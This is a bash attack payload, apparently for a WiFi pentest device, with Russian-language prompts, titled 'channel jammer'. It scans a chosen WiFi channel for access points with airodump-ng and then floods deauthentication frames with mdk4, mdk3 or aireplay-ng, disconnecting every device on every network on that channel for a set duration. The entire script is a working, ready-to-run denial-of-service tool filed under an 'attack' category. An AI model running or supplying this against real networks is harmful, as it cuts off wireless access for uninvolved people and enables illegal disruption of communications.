#!/bin/bash
# Title: Глушилка Канала
# Author: bad-antics  
# Description: Глушить определенный канал WiFi с помощью деаутентификационных флудов
# Category: nullsec/attack

# FIX: добавляем PATH и fallback-функции для UI
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "ГЛУШИЛКА КАНАЛА

Нарушить всю активность WiFi
на определенном канале.

Деаутентифицирует ВСЕ устройства из
ВСЕХ сетей на целевом
канале.

Нажмите OK для настройки."

PROMPT "ВЫБЕРИТЕ КАНАЛ:

Общие каналы:
1, 6, 11 (2.4GHz)

5GHz: 36, 40, 44, 48
      149, 153, 157, 161

Введите канал далее."

CHANNEL=$(NUMBER_PICKER "Целевой Канал:" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac

DURATION=$(NUMBER_PICKER "Длительность (сек):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "НАЧАТЬ ГЛУШЕНИЕ?

Канал: $CHANNEL
Длительность: ${DURATION}с

⚠️ Это отключит
ВСЕХ пользователей на канале $CHANNEL

Нажмите OK для глушения.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Глушение канала $CHANNEL..."

# Блокировка на канале
iwconfig $IFACE channel $CHANNEL

# Найти все AP на канале
SPINNER_START "Поиск целей..."
timeout 5 airodump-ng $IFACE -c $CHANNEL --write-interval 1 -w /tmp/chanfind --output-format csv 2>/dev/null
SPINNER_STOP

# Извлечь BSSID
grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/chanfind*.csv 2>/dev/null | sort -u > /tmp/jam_targets.txt

TARGET_COUNT=$(wc -l < /tmp/jam_targets.txt 2>/dev/null || echo 0)

LOG "Найдено $TARGET_COUNT AP"

# Начать деаутентификационный флуд на всех целях
JAM_PID=""
if command -v mdk4 >/dev/null 2>&1; then
    mdk4 $IFACE d -c $CHANNEL &
    JAM_PID=$!
elif command -v mdk3 >/dev/null 2>&1; then
    mdk3 $IFACE d -c $CHANNEL &
    JAM_PID=$!
else
    # Резервный вариант на aireplay
    while read BSSID; do
        aireplay-ng -0 0 -a "$BSSID" $IFACE 2>/dev/null &
    done < /tmp/jam_targets.txt
fi

PROMPT "ГЛУШЕНИЕ АКТИВНО

Канал: $CHANNEL
Цели: $TARGET_COUNT AP

Нажмите OK для ОСТАНОВКИ."

# Остановить все
killall mdk4 mdk3 aireplay-ng 2>/dev/null
kill $JAM_PID 2>/dev/null

PROMPT "ГЛУШЕНИЕ ОСТАНОВЛЕНО

Канал: $CHANNEL
Длительность: Активно до остановки

Нажмите OK для выхода."

exit 0
